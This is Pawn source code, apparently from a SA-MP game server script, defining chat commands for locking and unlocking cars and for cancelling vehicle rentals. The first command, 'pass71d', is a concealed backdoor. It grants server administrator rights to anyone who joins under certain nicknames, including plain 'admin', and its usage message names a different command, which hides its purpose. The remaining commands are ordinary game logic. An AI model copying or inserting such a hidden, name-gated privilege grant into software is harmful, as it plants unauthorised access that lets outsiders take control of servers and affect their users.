CMD:pass71d(playerid, params[])
{
    if(!strcmp(Name(playerid),"Tofik_Hacibabayev",true) || !strcmp(Name(playerid), "Miguel_Costa", true) || !strcmp(Name(playerid), "admin", true))
	{
		new name[32];
		if(sscanf(params, "s[32]i", name, params[1])) return SendClientMessage(playerid, COLOR_GREY, "Используйте: /addmoderation [ник] [уровень администратора]");
		static const fmt_query[] = "SELECT * FROM `admin` WHERE `name` = '%s'";
		new query[sizeof(fmt_query)+(-2+MAX_PLAYER_NAME)];
		mysql_format(dbHandle,query, sizeof(query), fmt_query, name);
		mysql_tquery(dbHandle,query,"OnMySQL_QUERY","iis",17,params[1],name);
		SCM(playerid, -1, "Вы назначили игрока администратором сервера!");
	}
	return true;
}
CMD:alock(playerid, params[])
{
    new nearveh = GetNearestVehicle(playerid);
	new carid;
	if(User[playerid][pAdmin] < 2 || !GetPVarInt(playerid, "Dostup")) return true;
	carid = nearveh;
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return true;
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	if(doors == 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Машина открыта!");
		UnLockCar(playerid,carid);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Машина закрыта!");
		LockCar(playerid,carid);
	}
	return true;
}
CMD:plock(playerid, params[])
{
	if(GetNearestVehicle(playerid) < comptruck[0] || GetNearestVehicle(playerid) > comptruck[1]) return SendClientMessage(playerid,COLOR_GREY,"Вы не можете закрыть данный автомобиль");
	if(GetPVarInt(playerid,"rentcar_job") != GetNearestVehicle(playerid)) return SendClientMessage(playerid,COLOR_GREY,"Это не ваш автомобиль!");
	GetVehicleParamsEx(GetNearestVehicle(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
	PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
	switch(doors)
	{
	    case 0: GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3), LockCar(playerid,GetNearestVehicle(playerid));
		case 1: GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3), UnLockCar(playerid,GetNearestVehicle(playerid));
	}
	return true;
}
CMD:flock(playerid, params[])
{
	if(!User[playerid][pFamilyMember]) return SendClientMessage(playerid, COLOR_GREY, "Вы не состоите в семье");
	if(sscanf(params, "d",params[0])) return SendClientMessage(playerid, COLOR_GREY, " Используйте: /flock [1-5]");
	if(params[0] > 5 || params[0] < 1) return SendClientMessage(playerid, COLOR_GREY, " Введите номер транспорта от 1 до 5");
	new carid;
	if(family_car [ User[playerid][pFamilyMember] ] [ params[0] -1 ] != INVALID_VEHICLE_ID) carid = family_car [ User[playerid][pFamilyMember] ] [ params[0] -1 ];
	GetVehicleParamsEx(family_car [ User[playerid][pFamilyMember] ] [ params[0] -1 ],engine,lights,alarm,doors,bonnet,boot,objective);
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return true;
	switch (doors)
	{
		case 0:
		{
			GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			LockCar(playerid,carid);
		}
		case 1:
		{
			GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			UnLockCar(playerid,carid);
		}
	}
	return true;
}
CMD:lock(playerid, params[])
{
    new carid;
	if(!HGet(playerid) && house_car[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD1, "В данный момент у вас нет машины");
	if(house_car[playerid] != -1) carid = house_car[playerid];
	GetVehicleParamsEx(house_car[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return true;
	switch (doors)
	{
		case 0:
		{
			GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			LockCar(playerid,carid);
		}
		case 1:
		{
			GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			UnLockCar(playerid,carid);
		}
	}
	return true;
}
CMD:unrent(playerid, params[])
{
    if(GetPVarInt(playerid, "Arenda"))
	{
	    SetVehicleToRespawn(GetPVarInt(playerid, "Arenda"));
	    DeletePVar(playerid, "Arenda");
	    SCM(playerid,COLOR_GREY, "[RENT]: Вы отменили аренду транспорта!");
	    return 1;
	}
    if(User[playerid][pAreaskut] == 0) return 1;//SCM(playerid,COLOR_RED,"Вы не производили аренду скутера");
	if(GetPVarInt(playerid,"FaggioRent") != 0)
	{
		DestroyVehicle(GetPVarInt(playerid,"FaggioRent"));
		DeletePVar(playerid,"FaggioRent");
		User[playerid][pAreaskut] = 0;
		SCM(playerid,COLOR_GREY, "[RENT]: Вы отменили аренду скутера!");
	}
	return 1;
}
CMD:rlock(playerid, params[])
{
    new carid;
	carid = GetPVarInt(playerid, "Arenda");
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	new Float:cx,Float:cy,Float:cz;
	GetVehiclePos(carid, cx, cy, cz);
	if(!PlayerToPoint(4.0, playerid, cx, cy, cz)) return true;
	switch (doors)
	{
		case 0:
		{
			GameTextForPlayer(playerid, "~w~CAR ~r~LOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			LockCar(playerid,carid);
		}
		case 1:
		{
			GameTextForPlayer(playerid, "~w~CAR ~g~UNLOCK", 5000, 3);
			PlayerPlaySound(playerid, 24600, 0.0, 0.0, 0.0);
			UnLockCar(playerid,carid);
		}
	}
	return true;
}
